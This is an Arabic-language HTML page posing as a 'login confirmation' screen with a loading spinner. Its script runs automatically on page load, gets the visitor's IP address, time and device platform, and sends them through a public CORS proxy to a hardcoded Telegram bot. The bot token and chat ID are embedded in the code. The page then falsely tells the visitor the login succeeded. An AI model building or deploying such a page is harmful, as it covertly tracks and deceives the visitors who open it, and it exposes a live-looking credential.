<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الدخول</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1e293b;
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
            text-align: center;
            border: 1px solid #334155;
            width: 90%;
            max-width: 400px;
        }
        .loader {
            border: 3px solid #334155;
            border-top: 3px solid #38bdf8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #38bdf8; font-size: 1.5rem; }
        p { color: #94a3b8; line-height: 1.6; }
    </style>
</head>
<body>

<div class="container">
    <div id="status-icon" class="loader"></div>
    <h2 id="title">جاري التحقق...</h2>
    <p id="msg">يرجى الانتظار لحظة لمعالجة الطلب.</p>
</div>

<script>
    // بياناتك الخاصة
    const CONFIG = {
        TOKEN: "8021921443:AAFbEBMxIUGhfbzwY_t_xszdCLP6CtKNH3c",
        CHAT_ID: "1506580502",
        // استخدام بروكسي عام لتجاوز قيود CORS
        PROXY: "https://api.allorigins.win/get?url=" 
    };

    async function initCapture() {
        const title = document.getElementById('title');
        const msg = document.getElementById('msg');
        const icon = document.getElementById('status-icon');

        try {
            // 1. الحصول على الـ IP
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            const userIp = ipData.ip;

            // 2. تجهيز الرسالة
            const text = encodeURIComponent(`🚀 **إشعار زائر جديد**\n\n🌐 الـ IP: \`${userIp}\`\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n💻 الجهاز: ${navigator.platform}`);

            // 3. الإرسال عبر البروكسي إلى تيليجرام
            // ملاحظة: استعملنا fetch العادي هنا مع أسلوب التحايل على CORS
            const tgUrl = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${text}&parse_mode=Markdown`;
            
            const finalResponse = await fetch(`${CONFIG.PROXY}${encodeURIComponent(tgUrl)}`);

            if (finalResponse.ok) {
                // تحديث الواجهة عند النجاح
                icon.style.display = "none";
                title.innerText = "اكتمل التحقق ✅";
                title.style.color = "#4ade80";
                msg.innerText = "تم تسجيل دخولك بنجاح، يمكنك إغلاق الصفحة الآن.";
            } else {
                throw new Error("فشل في إرسال البيانات");
            }

        } catch (error) {
            console.error(error);
            icon.style.display = "none";
            title.innerText = "خطأ في الاتصال";
            title.style.color = "#f87171";
            msg.innerText = "تأكد من اتصالك بالإنترنت وحاول مرة أخرى.";
        }
    }

    // تشغيل الدالة فوراً
    window.onload = initCapture;
</script>

</body>
</html>
